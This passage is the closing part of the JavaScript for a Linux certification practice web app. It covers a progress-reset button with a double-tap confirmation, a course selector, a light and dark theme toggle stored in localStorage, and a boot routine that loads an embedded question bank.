    t.append(el('div','dt',d.title));
    rowc.append(ring,t);rowc.onclick=()=>openDay(d.day);
    rowc.style.marginBottom='8px';app.append(rowc);
  });

  const hr=el('hr','sep');app.append(hr);
  const reset=el('button','btn sm','⟲ Reset all progress');
  reset.onclick=()=>{ if(confirmReset())return; };
  app.append(reset);
  const note=el('div','faint');note.style.fontSize='11px';note.style.marginTop='8px';
  note.textContent = state.syncMode==='cloud'?'Progress is synced to your Claude account and follows you across devices.':'Progress is saved in this browser. Open on your account to sync across devices.';
  app.append(note);
}
let resetArmed=false;
function confirmReset(){
  if(!resetArmed){resetArmed=true;toast('Tap reset again to confirm');setTimeout(()=>resetArmed=false,3000);return true;}
  state.progress={items:{},labs:{},daily:{},streak:0,lastActive:null};saveLocal();markDirty();resetArmed=false;
  toast('Progress reset');renderStats();return true;
}

/* ---------- course select + theme ---------- */
function buildCourseSelect(){
  const sel=$('#courseSel');sel.innerHTML='';
  state.data.courses.forEach(c=>{const o=el('option');o.value=c.id;o.textContent=c.name;sel.append(o);});
  sel.value=state.courseId;
  sel.onchange=()=>{state.courseId=sel.value;try{localStorage.setItem('linuxcertlab.course',sel.value);}catch(e){}
    state.quizActive=false;state.examActive=false;state.tab='today';renderTabs();renderTab();};
}
function initTheme(){
  const btn=$('#themeBtn');
  let cur=null;try{cur=localStorage.getItem('linuxcertlab.theme');}catch(e){}
  if(cur)document.documentElement.setAttribute('data-theme',cur);
  btn.onclick=()=>{
    const now=document.documentElement.getAttribute('data-theme');
    const mq=window.matchMedia('(prefers-color-scheme:dark)').matches;
    let nextT = now==='dark'?'light':now==='light'?'dark':(mq?'light':'dark');
    document.documentElement.setAttribute('data-theme',nextT);
    try{localStorage.setItem('linuxcertlab.theme',nextT);}catch(e){}
  };
}

/* ---------- boot ---------- */
async function boot(){
  loadLocal();initTheme();
  let data=null;
  try{data=JSON.parse($('#course-data').textContent);}catch(e){}
  if(!data||!data.courses||!data.courses.length){
    app.innerHTML='<div class="empty">Could not load the question bank. Try reopening the page.</div>';return;
  }
  state.data=data;
  let saved=null;try{saved=localStorage.getItem('linuxcertlab.course');}catch(e){}
  state.courseId = (saved&&data.courses.some(c=>c.id===saved))?saved:data.courses[0].id;
  buildCourseSelect();renderTabs();renderTab();
  initCloud();
  window.addEventListener('beforeunload',()=>{if(state.dirty)flushDb();});
}
boot();
</script>
